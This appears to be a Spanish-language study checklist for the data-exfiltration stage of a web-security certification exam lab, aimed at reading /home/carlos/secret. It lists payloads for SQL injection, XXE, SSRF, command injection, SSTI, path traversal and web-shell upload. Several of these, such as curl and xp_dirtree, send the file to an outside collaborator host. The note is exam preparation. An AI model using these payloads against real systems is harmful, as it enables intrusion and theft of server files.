# STAGE 3 — DATA EXFILTRATION

> **Objetivo único:** leer el fichero **`/home/carlos/secret`** y pegarlo en *Submit solution*.
> Ya soy **administrador** (Stage 2). Ahora **no hay víctima que navegue**: el enemigo es el **servidor**.
> Cada vulnerabilidad es *un camino distinto* para lo mismo: **leer ese fichero** (directo, por RCE, o por SSRF a `localhost:6566`).

## 🧰 Herramientas que tengo para atacar

- 👑 Ya soy **admin** → tengo acceso a features "de servidor" que el user normal no ve.
- 🌐 **Collaborator / oastify** → confirmar callbacks ciegos (XXE ciego, SSRF, OAST en command injection/SSTI).
- 🐚 **Web shells listos** en `vulnerabilities/file-upload-vulnerabilities/` → subir y pedir por GET.
- El objetivo **no visita** nada: yo disparo todo directo contra el server.

## 🎯 Qué busco (todo apunta a `/home/carlos/secret`)

1. **Lectura directa de fichero** (XXE `file://`, LFI/path traversal, `file_get_contents`).
2. **RCE** → `cat /home/carlos/secret` (command injection, SSTI, deserialización, file upload).
3. **SSRF** → `http://localhost:6566/` (o `file://` + path traversal hasta el fichero).

## 🚦 Arranque (siempre)

- [ ] Ya como admin → cazar features de servidor: **subida de archivos, import/export XML, plantillas, previews de URL, deserialización, formularios que rozan el SO**.
- [ ] **Burp Scan** → *Scan Insertion Points* sobre cada input server-side.
- [ ] Tener el **Collaborator** a mano para lo ciego.

---

## ✅ Vulnerabilidades (Stage 3)

### SQL Injection (SQLi)
> [!danger] 🚩 ¿Está o no está?
> ¿El admin tiene acceso a **algo que permita hacer un search** (o cualquier consulta a BD)?

> [!tip] 📍 Si hay SQLi acá, el objetivo casi seguro es `localhost:6566`
> El servicio de interés vive en **`http://localhost:6566/`**. Una SQLi en Stage 3 lo más probable es que sea el camino para **leer el secreto** (lectura de fichero por motor) o para **pegarle a ese servicio interno** (SSRF-in-SQL / exfil OOB). Priorizá eso: fingerprint del motor → lectura de fichero o callback. Ver [[vulnerabilities/007-ssrf/ssrf|SSRF]].

> *(idea propia: no es obvio leer un fichero con SQL)* → sí se puede en algunos motores.
- [ ] **MySQL**: `LOAD_FILE('/home/carlos/secret')` (requiere `secure_file_priv` permisivo).
- [ ] **PostgreSQL**: `COPY (...) TO/FROM`, `pg_read_file('/home/carlos/secret')`.
- [ ] **Stacked queries** → si el motor permite `;`, encadenar lectura/escritura.
- [ ] Si no hay lectura de fichero → **UNION/blind** para sacar datos que abran otra vía.

> [!tip] 💡 *(idea propia — caso de prueba)* SQLi → leer fichero **y exfiltrar por OAST**
> El combo peligroso: si la salida **no vuelve en la respuesta** (blind / sin UNION visible), juntás **lectura de fichero + canal OOB a Collaborator** en una sola query y te llevás el contenido sin verlo. Ojo: **casi todos requieren privilegios altos** (FILE / superuser / `secure_file_priv`) y son **específicos por motor** → primero fingerprint del DBMS.
- [ ] **Oracle** (es *XXE dentro de SQL* → [[vulnerabilities/006-xxe/xxe|XXE]]): `extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % p SYSTEM "http://'||(SELECT ...)||'.COLLAB/">%p;]>'),'/l')` → callback DNS/HTTP con los datos en el subdominio. Alt: `UTL_HTTP.request`.
- [ ] **PostgreSQL**: `COPY (SELECT pg_read_file('/home/carlos/secret')) TO PROGRAM 'curl http://COLLAB/?x=...'` (superuser) — o exfil por `dblink` a tu host.
- [ ] **MSSQL**: leer con `OPENROWSET(BULK '/home/carlos/secret', SINGLE_CLOB)` → exfiltrar por `xp_dirtree '\\<datos>.COLLAB\x'` (SMB → DNS).
- [ ] **MySQL (Windows)**: `LOAD_FILE(CONCAT('\\\\',(SELECT HEX(LOAD_FILE('/home/carlos/secret'))),'.COLLAB\\x'))` → SMB/DNS. En Linux el OOB de MySQL es limitado.
- [ ] Contenido grande → trocear con `SUBSTR` + hex y **reconstruir** desde los hits del Collaborator.

- 📁 `vulnerabilities/sql-injection/` · ofuscación en `vulnerabilities/obfuscacion/`

### XML External Entity (XXE)
> [!danger] 🚩 ¿Está o no está?
> **Algo parsea XML.** Buscá: envío de **XML** directo (stock check), **SOAP** detrás de un endpoint, o carga de **imágenes SVG / documentos DOCX/XLSX**.

> [!tip] 📍 Dónde probar / cómo detectar (mi mejor pista hoy)
> - [ ] **Subir imagen / avatar** → SVG con entidad. Generalo con [[vulnerabilities/006-xxe/scripts/README|gen_svg_xxe.py]] `-r file:///home/carlos/secret` → el secreto **se renderiza dentro de la imagen**. El más jugoso ahora que soy **admin**.
> - [ ] **Stock check / cualquier form**: ¿el body es XML? Si no, probá **cambiar `Content-Type` a `application/xml`** y mandar XML; o si mi valor entra a un XML del server, **XInclude**.
> - [ ] **Panel de admin / features habilitadas al admin**: import/export XML, acciones masivas, config que acepte archivos.
> - [ ] **Delete user → el `username`** podría terminar dentro de un XML/SOAP del backend (raro, pero no imposible) → probar entidad/XInclude ahí.
> - [ ] **Detección ciega:** meté una entidad de parámetro a Collaborator y **Poll now**; si hay callback DNS/HTTP → hay XXE aunque no refleje.

> **Objetivo: leer `/home/carlos/secret`.** Camino según qué devuelva:
- [ ] **Refleja** → entidad externa in-band `file:///home/carlos/secret` → [[vulnerabilities/006-xxe/examples/001-leer-archivo-in-band|001]].
- [ ] **No refleja (ciego)** → confirmar OOB ([[vulnerabilities/006-xxe/examples/005-xxe-ciego-callback-oob|005]]) → exfiltrar con **DTD externo** ([[vulnerabilities/006-xxe/examples/006-xxe-ciego-exfiltrar-con-dtd-externo|006]]).
- [ ] **El contenido rompe la exfil HTTP** → **error-based** ([[vulnerabilities/006-xxe/examples/007-xxe-ciego-error-based-con-dtd-externo|007]]); **server sin salida a internet** → **DTD local** ([[vulnerabilities/006-xxe/examples/008-xxe-ciego-reutilizar-dtd-local|008]]).
- [ ] **No controlás el XML** (solo un valor) → **XInclude** ([[vulnerabilities/006-xxe/examples/003-xinclude-sin-controlar-el-xml|003]]).
- [ ] *(escalada)* XXE como **SSRF** → `http://localhost:6566/` o path traversal al fichero ([[vulnerabilities/006-xxe/examples/002-xxe-a-ssrf-metadata-cloud|002]]).
- 📁 `vulnerabilities/006-xxe/` → [[vulnerabilities/006-xxe/xxe|entry point]] · [[vulnerabilities/006-xxe/labs/README|labs]] · ejemplos 001–008 · scripts.

### Server-Side Request Forgery (SSRF)
> [!danger] 🚩 ¿Está o no está?
> Un **Host header injection** deja pegarle a un **oastify**, o **`localhost:6566` responde**.

> [!tip] 📍 El servicio de interés está en `localhost:6566`
> **Primer objetivo a probar:** ¿existe / es alcanzable **`http://localhost:6566/`** desde el server? Ese es el servicio interno que buscamos. Confirmá que responde y navegá desde ahí (admin, endpoints internos, o `file://` al secreto).
- [ ] Parámetro que hace fetch server-side → `http://localhost:6566/` (¡el objetivo!) y otros internos.
- [ ] `file:///home/carlos/secret` si el fetcher acepta esquemas.
- [ ] **Probar el `Referer`** → puede haber un **analytics** que visite la URL de ese header (SSRF ciego, no refleja nada). Meté tu Collaborator y **Poll now**; si hay callback → seguí por [[vulnerabilities/007-ssrf/examples/006-ssrf-ciego-deteccion-oob|006 · detección OOB]].
- [ ] *(idea propia)* **Path traversal** en la URL interna hasta caer en el fichero.
- [ ] Bypass de filtros: IP encoding, redirect, `@`, `#`, DNS rebinding → detalle en [[vulnerabilities/007-ssrf/ssrf|entry point SSRF]].
- [ ] **Si el filtro no cede → buscá un open redirect** y encadenalo (la whitelist ve una URL propia, el `302` te lleva al interno). **Mirá en especial una funcionalidad de "siguiente" (next post / next product)** cuyo parámetro (`path`, `url`, `next`, `returnUrl`) termine en un `Location:` → apuntalo a `http://localhost:6566/`. Cómo detectarlo → [[vulnerabilities/open-redirect/README|Open Redirect]] · uso → [[vulnerabilities/007-ssrf/examples/005-bypass-open-redirect|ejemplo 005]].

> [!note] 🔗 Muy relacionado con **Host Header injection**
> Si `localhost:6566` no sale por un parámetro-URL, probá **inyectar el `Host`** (o `X-Forwarded-Host`) para que el server se pegue solo a su servicio interno / a un oastify. Sin entrar en detalle acá → se ve en `vulnerabilities/016-host-header-injection/`.
- 📁 `vulnerabilities/007-ssrf/` → [[vulnerabilities/007-ssrf/ssrf|entry point]] · [[vulnerabilities/007-ssrf/labs/README|labs]]

### OS Command Injection (OSCi)
> [!danger] 🚩 ¿Está o no está? — **acá es casi evidente**
> **Regla simple: si el admin toca un parámetro, se prueba.** No hace falta que la feature "parezca" que roza el SO — como admin tenés acceso a peticiones que el user normal no ve, y **cualquiera de ellas que reciba un parámetro** (form, acción del panel, config, check de stock, feedback) **ya es motivo suficiente** para inyectar y ver si ejecuta. Es **barato de probar** y el premio es **RCE directo** → `cat /home/carlos/secret`.

- [ ] **Barré TODOS los parámetros** (incluí headers como `User-Agent`/`Referer`) con separadores: `;` `|` `||` `&` `&&` `$(...)` `` `...` `` `%0a`.
- [ ] **In-band** (¿vuelve la salida?) → `1|whoami` directo → [[vulnerabilities/027-os-command-injection/examples/001-simple-in-band|001]].
- [ ] **Ciego** → time delay (`<param>=x||sleep+5||`) → [[vulnerabilities/027-os-command-injection/examples/002-blind-time-delay|002]]; o confirmar por **OAST/DNS** a Collaborator → [[vulnerabilities/027-os-command-injection/examples/004-blind-oob-interaction|004]].
- [ ] **Leer el secreto:** `;cat+/home/carlos/secret` (in-band) o, si es ciego, exfil OOB.
- [ ] **El secreto no cabe en un DNS →** POSTealo **entero** por HTTP: `<param>=||curl+--data+@/home/carlos/secret+https://COLLAB||` → [[vulnerabilities/027-os-command-injection/examples/006-exfil-archivo-completo|006 ⭐]].
- 📁 `vulnerabilities/027-os-command-injection/` → [[vulnerabilities/027-os-command-injection/os-command-injection|entry point]] · ejemplos 001–006.

### Server-Side Template Injection (SSTI)
> [!danger] 🚩 ¿Está o no está?
> Hay una **plantilla editable** (cambiar nombre, mensajes, etc.) que luego **se inserta/renderiza** → confirmar con **oastify**.

- [ ] Fuzz `${{7*7}}`, `{{7*7}}`, `<%= 7*7 %>` → detectar motor por la respuesta.
- [ ] Confirmar por OAST si es ciego (callback desde el render).
- [ ] Payload de **RCE** del motor → `cat /home/carlos/secret`.
- 📁 `vulnerabilities/server-side-template-injection/`

### Directory Traversal / LFI (Path Traversal)
> [!danger] 🚩 ¿Está o no está?
> Hay un **recurso que el usuario normal no carga**, servido con un parámetro tipo **`fileName`** (o similar).

- [ ] `../../../../home/carlos/secret` en el parámetro de fichero.
- [ ] Bypass: `....//`, encoding (`%2e`, doble `%252e`), null byte, prefijo/sufijo forzado.
- 📁 `vulnerabilities/path-transversal/` · ofuscación en `vulnerabilities/obfuscacion/`

### Insecure Deserialization (Deser)
> [!danger] 🚩 ¿Está o no está?
> **Aparece una cookie nueva** (u objeto serializado en params): PHP `O:`, Java `rO0`, .NET, Python pickle.

- [ ] Identificar el formato del objeto serializado.
- [ ] **Probar variantes de ysoserial** (Java) / **phpggc** (PHP) → gadget chain → RCE.
- [ ] RCE → `cat /home/carlos/secret`.
- 📁 `vulnerabilities/insecure_deserialization/`

### File Upload → RCE  ⭐ (el secreto a mano)
> [!danger] 🚩 ¿Está o no está?
> **Permite subir archivos** (típicamente solo al **administrador**) → avatar, adjunto, import.

- [ ] Subir **web shell** PHP y pedirlo por GET desde `/files/avatars/…`.
- [ ] Leer el secreto directo (shells ya listos en la carpeta):
  - `example_best.php?command=cat%20/home/carlos/secret` (system, salida limpia)
  - `exploit.php` (file_get_contents, **sin parámetro**)
- [ ] Bypass extensión / `Content-Type` / magic bytes / polyglot si filtran.
- 📁 **`vulnerabilities/file-upload-vulnerabilities/`** → shells listos + cheat-sheet de invocación.

---

## 🔎 Extras que ya teníamos (útiles en Stage 3)

### Server-Side Prototype Pollution (SSPP)
- [ ] JSON con `__proto__` → detectar cambio de comportamiento server-side.
- [ ] Escalar a RCE (gadget en el runtime, p.ej. `child_process`) → leer el secreto.
- 📁 `vulnerabilities/prototype-pollution/`

---

> [!success] Salida del Stage 3
> Contenido de `/home/carlos/secret` → **Submit solution**. Examen aprobado. 🎉

> [!todo] Pendiente de completar
> Afinar payloads "a mano" por motor (SSTI, XXE file-read, LFI).
